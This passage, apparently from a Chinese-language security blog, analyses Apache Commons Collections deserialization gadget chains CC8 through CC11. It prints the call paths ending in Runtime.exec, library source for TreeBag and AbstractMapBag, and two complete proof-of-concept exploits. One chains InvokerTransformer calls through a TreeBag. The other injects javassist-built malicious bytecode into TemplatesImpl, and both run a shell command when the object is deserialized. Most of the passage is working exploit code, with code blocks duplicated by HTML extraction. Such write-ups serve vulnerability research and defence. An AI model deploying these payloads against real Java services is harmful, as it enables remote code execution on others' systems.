class="hljs-selector-class">.commons</span><span class="hljs-selector-class">.collections</span><span class="hljs-selector-class">.functors</span><span class="hljs-selector-class">.InvokerTransformer</span><span class="hljs-selector-class">.transform</span><br>java<span class="hljs-selector-class">.lang</span><span class="hljs-selector-class">.reflect</span><span class="hljs-selector-class">.Method</span><span class="hljs-selector-class">.invoke</span><br>sun<span class="hljs-selector-class">.reflect</span><span class="hljs-selector-class">.DelegatingMethodAccessorImpl</span><span class="hljs-selector-class">.invoke</span><br>sun<span class="hljs-selector-class">.reflect</span><span class="hljs-selector-class">.NativeMethodAccessorImpl</span><span class="hljs-selector-class">.invoke</span><br>sun<span class="hljs-selector-class">.reflect</span><span class="hljs-selector-class">.NativeMethodAccessorImpl</span><span class="hljs-selector-class">.invoke0</span><br>java<span class="hljs-selector-class">.lang</span><span class="hljs-selector-class">.Runtime</span>.exec<br></code></pre></td></tr></table></figure>



<h2 id="0x3-8-Commons-Collections8"><a href="#0x3-8-Commons-Collections8" class="headerlink" title="0x3.8 Commons Collections8"></a>0x3.8 Commons Collections8</h2><p>限制：</p>
<ul>
<li>Commons Collections 4.0</li>
</ul>
<p>CC8利用org.apache.commons.collections.bag.TreeBag中readObject会执行compare方法来构造利用链。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre class=" language-hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TreeBag</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">AbstractMapBag</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">SortedBag</span>, <span class="hljs-title">Serializable</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">long</span> serialVersionUID = -<span class="hljs-number">7740146511091606676L</span>;<br>  <br>  	<span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">readObject</span><span class="hljs-params">(ObjectInputStream in)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException </span>&#123;<br>        in.defaultReadObject();<br>        Comparator comp = (Comparator)in.readObject();<br>        <span class="hljs-keyword">super</span>.doReadObject(<span class="hljs-keyword"><code class="language-hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TreeBag</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">AbstractMapBag</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">SortedBag</span>, <span class="hljs-title">Serializable</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">long</span> serialVersionUID = -<span class="hljs-number">7740146511091606676L</span>;<br>  <br>  	<span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">readObject</span><span class="hljs-params">(ObjectInputStream in)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException </span>&#123;<br>        in.defaultReadObject();<br>        Comparator comp = (Comparator)in.readObject();<br>        <span class="hljs-keyword">super</span>.doReadObject(<span class="hljs-keyword">new</span> TreeMap(comp), in);<br>    &#125;<br></code></pre></td></tr></table></figure>

<p>跟进super.doReadObject方法</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre class=" language-hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">AbstractMapBag</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Bag</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">transient</span> Map map;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> size;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">transient</span> <span class="hljs-keyword">int</span> modCount;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">transient</span> Set uniqueSet;<br><br>		<span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">doReadObject</span><span class="hljs-params">(Map map, ObjectInputStream in)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException </span>&#123;<br>        <span class="hljs-keyword">this</span>.map = map;<br>        <span class="hljs-keyword">int</span> entrySize = in.readInt();<br><br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; entrySize; ++i) &#123;<br>            Object obj = in.readObject();<br>            <span class="hljs-keyword">int</span> count = in.readInt();<br>          	<span class="hljs-comment">// 重点在这，这个地方的map如果是TreeMap 就会执行transform</span><br>            map.put(obj, <span class="hljs-keyword">new</span> MutableInteger(count));<br>            <span class="hljs-keyword"><code class="language-hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">AbstractMapBag</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Bag</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">transient</span> Map map;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> size;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">transient</span> <span class="hljs-keyword">int</span> modCount;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">transient</span> Set uniqueSet;<br><br>		<span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">doReadObject</span><span class="hljs-params">(Map map, ObjectInputStream in)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException </span>&#123;<br>        <span class="hljs-keyword">this</span>.map = map;<br>        <span class="hljs-keyword">int</span> entrySize = in.readInt();<br><br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; entrySize; ++i) &#123;<br>            Object obj = in.readObject();<br>            <span class="hljs-keyword">int</span> count = in.readInt();<br>          	<span class="hljs-comment">// 重点在这，这个地方的map如果是TreeMap 就会执行transform</span><br>            map.put(obj, <span class="hljs-keyword">new</span> MutableInteger(count));<br>            <span class="hljs-keyword">this</span>.size += count;<br>        &#125;<br><br>    &#125;<br></code></pre></td></tr></table></figure>



<p>POC1:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre class=" language-hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC8_1</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        String cmd = <span class="hljs-string">&quot;open -a Calculator.app&quot;</span>;<br><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> Transformer[] &#123;<br>                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> Class[] &#123;String.class, Class[].class &#125;, <span class="hljs-keyword">new</span> Object[] &#123; <span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> Class[<span class="hljs-number">0</span>] &#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> Class[] &#123;Object.class, Object[].class &#125;, <span class="hljs-keyword">new</span> Object[] &#123; <span class="hljs-keyword">null</span>, <span class="hljs-keyword">new</span> Object[<span class="hljs-number">0</span>] &#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> Class[] &#123; String.class&#125;, <span class="hljs-keyword">new</span> String[] &#123;cmd&#125;),<br>        &#125;;<br>        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(transformers);<br>        TransformingComparator transformingComparator = <span class="hljs-keyword">new</span> TransformingComparator(chainedTransformer);<br><br>        TreeBag treeBag = <span class="hljs-keyword">new</span> TreeBag(transformingComparator);<br>        treeBag.add(<span class="hljs-keyword">null</span>);<br><br>        <span class="hljs-comment">// 模拟序列化和反序列化</span><br>        ObjectOutputStream outputStream = <span class="hljs-keyword">new</span> ObjectOutputStream(<span class="hljs-keyword">new</span> FileOutputStream(<span class="hljs-string">&quot;serialize.ser&quot;</span>));<br>        outputStream.writeObject(treeBag);<br>        outputStream.close();<br><br>        ObjectInputStream inputStream=<span class="hljs-keyword">new</span> ObjectInputStream(<span class="hljs-keyword">new</span> FileInputStream(<span class="hljs-string"><code class="language-hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC8_1</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        String cmd = <span class="hljs-string">&quot;open -a Calculator.app&quot;</span>;<br><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> Transformer[] &#123;<br>                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> Class[] &#123;String.class, Class[].class &#125;, <span class="hljs-keyword">new</span> Object[] &#123; <span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> Class[<span class="hljs-number">0</span>] &#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> Class[] &#123;Object.class, Object[].class &#125;, <span class="hljs-keyword">new</span> Object[] &#123; <span class="hljs-keyword">null</span>, <span class="hljs-keyword">new</span> Object[<span class="hljs-number">0</span>] &#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> Class[] &#123; String.class&#125;, <span class="hljs-keyword">new</span> String[] &#123;cmd&#125;),<br>        &#125;;<br>        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(transformers);<br>        TransformingComparator transformingComparator = <span class="hljs-keyword">new</span> TransformingComparator(chainedTransformer);<br><br>        TreeBag treeBag = <span class="hljs-keyword">new</span> TreeBag(transformingComparator);<br>        treeBag.add(<span class="hljs-keyword">null</span>);<br><br>        <span class="hljs-comment">// 模拟序列化和反序列化</span><br>        ObjectOutputStream outputStream = <span class="hljs-keyword">new</span> ObjectOutputStream(<span class="hljs-keyword">new</span> FileOutputStream(<span class="hljs-string">&quot;serialize.ser&quot;</span>));<br>        outputStream.writeObject(treeBag);<br>        outputStream.close();<br><br>        ObjectInputStream inputStream=<span class="hljs-keyword">new</span> ObjectInputStream(<span class="hljs-keyword">new</span> FileInputStream(<span class="hljs-string">"serialize.ser"</span>));<br>        inputStream.readObject();<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>POC2:</p>
<p>利用TemplateImpl创建恶意类</p>
<h2 id="0x3-9-Commons-Collections9"><a href="#0x3-9-Commons-Collections9" class="headerlink" title="0x3.9 Commons  Collections9"></a>0x3.9 Commons  Collections9</h2><p>主要利用的是CommonsCollections:3.2版本新增的DefaultedMap来代替LazyMap，因为这两个Map有同样的get函数可以被利用</p>
<h2 id="0x3-10-Commons-Collections10"><a href="#0x3-10-Commons-Collections10" class="headerlink" title="0x3.10 Commons Collections10"></a>0x3.10 Commons Collections10</h2><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre class=" language-hljs livescript">Hashtable.readO bject<span class="hljs-function"><span class="hljs-params">()</span></span><br><span class="hljs-function">    -&gt;</span> Hashtable.reconstitutionPut<br>    -&gt; key.hashCode<span class="hljs-function"><span class="hljs-params">()</span> =&gt; <span class="hljs-title">TiedMapEntry</span>.<span class="hljs-title">hashCode</span><span class="hljs-params">()</span></span><br><span class="hljs-function">    -&gt;</span> TiedMapEntry.getValue<br>    -&gt; TiedMapEntry.<span class="hljs-keyword">map</span>.get<span class="hljs-function"><span class="hljs-params">()</span> =&gt; <span class="hljs-title">LazyMap</span>.<span class="hljs-title">get</span><span class="hljs-params">()</span></span><br><span class="hljs-function">    -&gt;</span> factory.transform<span class="hljs-function"><span class="hljs-params">()</span> =&gt; <span class="hljs-title">ChainedTransformer</span>.<span class="hljs-title">transform</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><code class="language-hljs livescript">Hashtable.readO bject<span class="hljs-function"><span class="hljs-params">()</span></span><br><span class="hljs-function">    -&gt;</span> Hashtable.reconstitutionPut<br>    -&gt; key.hashCode<span class="hljs-function"><span class="hljs-params">()</span> =&gt; <span class="hljs-title">TiedMapEntry</span>.<span class="hljs-title">hashCode</span><span class="hljs-params">()</span></span><br><span class="hljs-function">    -&gt;</span> TiedMapEntry.getValue<br>    -&gt; TiedMapEntry.<span class="hljs-keyword">map</span>.get<span class="hljs-function"><span class="hljs-params">()</span> =&gt; <span class="hljs-title">LazyMap</span>.<span class="hljs-title">get</span><span class="hljs-params">()</span></span><br><span class="hljs-function">    -&gt;</span> factory.transform<span class="hljs-function"><span class="hljs-params">()</span> =&gt; <span class="hljs-title">ChainedTransformer</span>.<span class="hljs-title">transform</span><span class="hljs-params">()</span></span><br><span class="hljs-function">    -></span> 前文构造的Runtime.getRuntime().exec()<br></code></pre></td></tr></table></figure>





<h2 id="0x3-11-Commons-Collections-11"><a href="#0x3-11-Commons-Collections-11" class="headerlink" title="0x3.11 Commons Collections 11"></a>0x3.11 Commons Collections 11</h2><p>限制：</p>
<ul>
<li>CommonsCollections 3.1-3.2.1</li>
<li>JDK版本：暂无限制</li>
</ul>
<p><a target="_blank" rel="noopener" href="http://wjlshare.com/archives/1536">http://wjlshare.com/archives/1536</a></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre class=" language-hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> javassist.ClassClassPath;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.HashSet;<br><br><span class="hljs-meta">@SuppressWarnings(&quot;all&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC11</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        String cmd = <span class="hljs-string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;open  /System/Applications/Calculator.app\&quot;);&quot;</span>;<br>      <br>        <span class="hljs-comment">// 利用javasist动态创建恶意字节码</span><br>        ClassPool pool = ClassPool.getDefault();<br>        pool.insertClassPath(<span class="hljs-keyword">new</span> ClassClassPath(AbstractTranslet.class));<br>        CtClass cc = pool.makeClass(<span class="hljs-string">&quot;Cat&quot;</span>);<br>        cc.makeClassInitializer().insertBefore(cmd);<br>        String randomClassName = <span class="hljs-string">&quot;EvilCat&quot;</span> + System.nanoTime();<br>        cc.setName(randomClassName);<br>        cc.setSuperclass(pool.get(AbstractTranslet.class.getName())); <span class="hljs-comment">//设置父类为AbstractTranslet，避免报错</span><br><br>        <span class="hljs-comment">// 写入.class 文件</span><br>        <span class="hljs-comment">// 将我的恶意类转成字节码，并且反射设置 bytecodes</span><br>        <span class="hljs-keyword">byte</span>[] classBytes = cc.toBytecode();<br>        <span class="hljs-keyword">byte</span>[][] targetByteCodes = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[][]&#123;classBytes&#125;;<br>        TemplatesImpl templates = TemplatesImpl.class.newInstance();<br><br>        Field f0 = templates.getClass().getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        f0.setAccessible(<span class="hljs-keyword">true</span>);<br>        f0.set(templates,targetByteCodes);<br><br>        f0 = templates.getClass().getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        f0.setAccessible(<span class="hljs-keyword">true</span>);<br>        f0.set(templates,<span class="hljs-string">&quot;name&quot;</span>);<br><br>        f0 = templates.getClass().getDeclaredField(<span class="hljs-string">&quot;_class&quot;</span>);<br>        f0.setAccessible(<span class="hljs-keyword">true</span>);<br>        f0.set(templates,<span class="hljs-keyword">null</span>);<br><br>        InvokerTransformer transformer = <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;asdfasdfasdf&quot;</span>, <span class="hljs-keyword">new</span> Class[<span class="hljs-number">0</span>], <span class="hljs-keyword">new</span> Object[<span class="hljs-number">0</span>]);<br>        HashMap innermap = <span class="hljs-keyword">new</span> HashMap();<br>        LazyMap map = (LazyMap)LazyMap.decorate(innermap,transformer);<br>        TiedMapEntry tiedmap = <span class="hljs-keyword">new</span> TiedMapEntry(map,templates);<br>        HashSet hashset = <span class="hljs-keyword">new</span> HashSet(<span class="hljs-number">1</span>);<br>        hashset.add(<span class="hljs-string">&quot;foo&quot;</span>);<br>        Field f = <span class="hljs-keyword">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            f = HashSet.class.getDeclaredField(<span class="hljs-string">&quot;map&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (NoSuchFieldException e) &#123;<br>            f = HashSet.class.getDeclaredField(<span class="hljs-string">&quot;backingMap&quot;</span>);<br>        &#125;<br>        f.setAccessible(<span class="hljs-keyword">true</span>);<br>        HashMap hashset_map = (HashMap) f.get(hashset);<br><br>        Field f2 = <span class="hljs-keyword">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            f2 = HashMap.class.getDeclaredField(<span class="hljs-string">&quot;table&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (NoSuchFieldException e) &#123;<br>            f2 = HashMap.class.getDeclaredField(<span class="hljs-string">&quot;elementData&quot;</span>);<br>        &#125;<br><br>        f2.setAccessible(<span class="hljs-keyword">true</span>);<br>        Object[] array = (Object[])f2.get(hashset_map);<br><br>        Object node = array[<span class="hljs-number">0</span>];<br>        <span class="hljs-keyword">if</span>(node == <span class="hljs-keyword">null</span>)&#123;<br>            node = array[<span class="hljs-number">1</span>];<br>        &#125;<br>        Field keyField = <span class="hljs-keyword">null</span>;<br>        <span class="hljs-keyword">try</span>&#123;<br>            keyField = node.getClass().getDeclaredField(<span class="hljs-string">&quot;key&quot;</span>);<br>        &#125;<span class="hljs-keyword">catch</span>(Exception e)&#123;<br>            keyField = Class.forName(<span class="hljs-string">&quot;java.util.MapEntry&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;key&quot;</span>);<br>        &#125;<br>        keyField.setAccessible(<span class="hljs-keyword">true</span>);<br>        keyField.set(node,tiedmap);<br><br>        Field f3 = transformer.getClass().getDeclaredField(<span class="hljs-string">&quot;iMethodName&quot;</span>);<br>        f3.setAccessible(<span class="hljs-keyword">true</span>);<br>        f3.set(transformer,<span class="hljs-string">&quot;newTransformer&quot;</span>);<br><br>        <span class="hljs-keyword">try</span>&#123;<br>            ObjectOutputStream outputStream = <span class="hljs-keyword">new</span> ObjectOutputStream(<span class="hljs-keyword">new</span> FileOutputStream(<span class="hljs-string">&quot;./cc11&quot;</span>));<br>            outputStream.writeObject(hashset);<br>            outputStream.close();<br><br>            ObjectInputStream inputStream = <span class="hljs-keyword">new</span> ObjectInputStream(<span class="hljs-keyword">new</span> FileInputStream(<span class="hljs-string">&quot;./cc11&quot;</span>));<br>            inputStream.readObject();<br>        &#125;<span class="hljs-keyword"><code class="language-hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> javassist.ClassClassPath;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.HashSet;<br><br><span class="hljs-meta">@SuppressWarnings(&quot;all&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC11</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        String cmd = <span class="hljs-string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;open  /System/Applications/Calculator.app\&quot;);&quot;</span>;<br>      <br>        <span class="hljs-comment">// 利用javasist动态创建恶意字节码</span><br>        ClassPool pool = ClassPool.getDefault();<br>        pool.insertClassPath(<span class="hljs-keyword">new</span> ClassClassPath(AbstractTranslet.class));<br>        CtClass cc = pool.makeClass(<span class="hljs-string">&quot;Cat&quot;</span>);<br>        cc.makeClassInitializer().insertBefore(cmd);<br>        String randomClassName = <span class="hljs-string">&quot;EvilCat&quot;</span> + System.nanoTime();<br>        cc.setName(randomClassName);<br>        cc.setSuperclass(pool.get(AbstractTranslet.class.getName())); <span class="hljs-comment">//设置父类为AbstractTranslet，避免报错</span><br><br>        <span class="hljs-comment">// 写入.class 文件</span><br>        <span class="hljs-comment">// 将我的恶意类转成字节码，并且反射设置 bytecodes</span><br>        <span class="hljs-keyword">byte</span>[] classBytes = cc.toBytecode();<br>        <span class="hljs-keyword">byte</span>[][] targetByteCodes = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[][]&#123;classBytes&#125;;<br>        TemplatesImpl templates = TemplatesImpl.class.newInstance();<br><br>        Field f0 = templates.getClass().getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        f0.setAccessible(<span class="hljs-keyword">true</span>);<br>        f0.set(templates,targetByteCodes);<br><br>        f0 = templates.getClass().getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        f0.setAccessible(<span class="hljs-keyword">true</span>);<br>        f0.set(templates,<span class="hljs-string">&quot;name&quot;</span>);<br><br>        f0 = templates.getClass().getDeclaredField(<span class="hljs-string">&quot;_class&quot;</span>);<br>        f0.setAccessible(<span class="hljs-keyword">true</span>);<br>        f0.set(templates,<span class="hljs-keyword">null</span>);<br><br>        InvokerTransformer transformer = <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;asdfasdfasdf&quot;</span>, <span class="hljs-keyword">new</span> Class[<span class="hljs-number">0</span>], <span class="hljs-keyword">new</span> Object[<span class="hljs-number">0</span>]);<br>        HashMap innermap = <span class="hljs-keyword">new</span> HashMap();<br>        LazyMap map = (LazyMap)LazyMap.decorate(innermap,transformer);<br>        TiedMapEntry tiedmap = <span class="hljs-keyword">new</span> TiedMapEntry(map,templates);<br>        HashSet hashset = <span class="hljs-keyword">new</span> HashSet(<span class="hljs-number">1</span>);<br>        hashset.add(<span class="hljs-string">&quot;foo&quot;</span>);<br>        Field f = <span class="hljs-keyword">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            f = HashSet.class.getDeclaredField(<span class="hljs-string">&quot;map&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (NoSuchFieldException e) &#123;<br>            f = HashSet.class.getDeclaredField(<span class="hljs-string">&quot;backingMap&quot;</span>);<br>        &#125;<br>        f.setAccessible(<span class="hljs-keyword">true</span>);<br>        HashMap hashset_map = (HashMap) f.get(hashset);<br><br>        Field f2 = <span class="hljs-keyword">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            f2 = HashMap.class.getDeclaredField(<span class="hljs-string">&quot;table&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (NoSuchFieldException e) &#123;<br>            f2 = HashMap.class.getDeclaredField(<span class="hljs-string">&quot;elementData&quot;</span>);<br>        &#125;<br><br>        f2.setAccessible(<span class="hljs-keyword">true</span>);<br>        Object[] array = (Object[])f2.get(hashset_map);<br><br>        Object node = array[<span class="hljs-number">0</span>];<br>        <span class="hljs-keyword">if</span>(node == <span class="hljs-keyword">null</span>)&#123;<br>            node = array[<span class="hljs-number">1</span>];<br>        &#125;<br>        Field keyField = 